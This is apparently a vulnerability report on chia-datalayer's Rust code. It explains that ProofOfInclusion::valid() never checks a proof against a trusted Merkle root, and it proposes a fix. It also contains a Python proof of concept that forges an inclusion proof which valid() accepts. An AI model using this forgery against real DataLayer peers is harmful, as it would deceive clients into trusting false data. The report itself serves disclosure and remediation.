### Title
`ProofOfInclusion::valid()` Tautological Root Check Allows Forged Inclusion Proofs - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` contains a tautological final check that is always `true` when the proof has at least one layer. The function only verifies internal consistency of the proof chain but never compares the computed root against any externally trusted root. An attacker can forge a `ProofOfInclusion` claiming any key-value pair is included in a DataLayer tree, and `valid()` will return `true`.

### Finding Description

The `valid()` method in `ProofOfInclusion` is:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;
    }

    existing_hash == self.root_hash()   // ← always true when layers is non-empty
}
``` [1](#0-0) 

And `root_hash()` is:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

**The tautology:** After the loop body verifies `calculated_hash == layer.combined_hash` and then sets `existing_hash = calculated_hash`, the post-loop state is:

- `existing_hash` = last `calculated_hash` = last `layer.combined_hash` (enforced by the loop)
- `self.root_hash()` = `last.combined_hash` (by definition)

Therefore `existing_hash == self.root_hash()` is **unconditionally true** whenever `self.layers` is non-empty. The final check adds no validation. The function never compares the computed root against any externally known or trusted root.

The `ProofOfInclusion` struct is `Streamable` (serializable/deserializable) and exposed through Python bindings, meaning it is designed to be transmitted between DataLayer peers. [3](#0-2) 

A forged proof is trivially constructable: pick any `node_hash` (the leaf hash you want to falsely claim is in the tree), then build a chain of `ProofOfInclusionLayer` entries where each `combined_hash` is set to `calculate_internal_hash(previous_hash, side, other_hash)` for arbitrary `other_hash` values. The chain is internally consistent, so `valid()` returns `true`, but the final `combined_hash` (the "root") has no relation to the actual committed tree root.

The `get_proof_of_inclusion` method on `MerkleBlob` generates proofs correctly from the local blob, but the `valid()` method — the only verification primitive exposed to callers — cannot distinguish a genuine proof from a forged one. [4](#0-3) 

All existing tests call `valid()` without separately comparing `root_hash()` against a known external root, confirming that `valid()` is treated as the complete validation primitive. [5](#0-4) 

### Impact Explanation

This matches the allowed High impact: **"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state."**

A DataLayer client that receives a `ProofOfInclusion` from an untrusted peer and calls `valid()` will accept any forged proof as valid. This allows a malicious DataLayer server to:

1. Claim that a key-value pair exists in the tree when it does not (false inclusion).
2. Claim that a key-value pair has a different value than the committed one.
3. Prove membership in a tree root that was never committed.

This undermines the entire DataLayer data-integrity guarantee, which depends on Merkle proofs to allow clients to verify state without trusting the server.

### Likelihood Explanation

The DataLayer is explicitly designed for data sharing between parties over the network. `ProofOfInclusion` is `Streamable` (network-serializable) and exposed via Python bindings. Any client that calls `proof.valid()` on a received proof — the natural and documented usage — is vulnerable. The forged proof requires no cryptographic break; it is a pure construction of internally consistent hash chains.

### Recommendation

The `valid()` method must accept a trusted root as a parameter and compare the computed root against it:

```rust
pub fn valid(&self, trusted_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == trusted_root
}
```

Alternatively, if the no-argument signature must be preserved for API compatibility, `valid()` should be documented as checking only internal consistency, and a separate `valid_for_root(root: &Hash) -> bool` method should be added and used at all verification sites.

All call sites — Rust tests, Python tests, and any production DataLayer verification code — must be updated to supply the known committed root.

### Proof of Concept

```python
from chia_rs import MerkleBlob, ProofOfInclusion, ProofOfInclusionLayer, Side
from chia_protocol import Bytes32

# Attacker wants to forge a proof that key 9999 (which does not exist) is in the tree
# Build a real tree with key 1 only
blob = MerkleBlob(blob=bytearray())
blob.batch_insert([(1, 100)], [bytes([0xAA]*32)])
blob.calculate_lazy_hashes()

# Forge a proof for a non-existent key
fake_leaf_hash = bytes([0xBB]*32)   # attacker-chosen "leaf hash"
fake_sibling   = bytes([0xCC]*32)   # arbitrary sibling

import hashlib
combined = hashlib.sha256(b'\x02' + fake_sibling + fake_leaf_hash).digest()

forged_proof = ProofOfInclusion(
    node_hash=fake_leaf_hash,
    layers=[
        ProofOfInclusionLayer(
            other_hash_side=Side.Left,
            other_hash=fake_sibling,
            combined_hash=combined,   # internally consistent
        )
    ],
)

# valid() returns True even though this proof has nothing to do with the real tree
assert forged_proof.valid(), "Forged proof accepted!"
# The forged root (combined) differs from the real tree root, but valid() never checks
assert forged_proof.root_hash() != blob.get_root(), "Roots differ, yet valid() passed"
```

    pub fn get_proof_of_inclusion(
        &self,
        key: KeyId,
    ) -> Result<proof_of_inclusion::ProofOfInclusion, Error> {
        let mut index = *self
            .block_status_cache
            .get_index_by_key(key)
            .ok_or(Error::UnknownKey(key))?;

        let node = self
            .get_node(index)?
            .expect_leaf("key to index mapping should only have leaves");

        let parents = self.get_lineage_blocks_with_indexes(index)?;
        let mut layers: Vec<proof_of_inclusion::ProofOfInclusionLayer> = Vec::new();
        let mut parents_iter = parents.iter();
        // first in the lineage is the index itself, second is the first parent
        parents_iter.next();
        for (next_index, block) in parents_iter {
            if block.metadata.dirty {
                return Err(Error::Dirty(*next_index));
            }
            let parent = block
                .node
                .expect_internal("all nodes after the first should be internal");
            let sibling_index = parent.sibling_index(index)?;
            let sibling_block = self.get_block(sibling_index)?;
            let sibling = sibling_block.node;
            let layer = proof_of_inclusion::ProofOfInclusionLayer {
                other_hash_side: parent.get_sibling_side(index)?,
                other_hash: sibling.hash(),
                combined_hash: parent.hash,
            };
            layers.push(layer);
            index = *next_index;
        }

        Ok(proof_of_inclusion::ProofOfInclusion {
            node_hash: node.hash,
            layers,
        })
    }
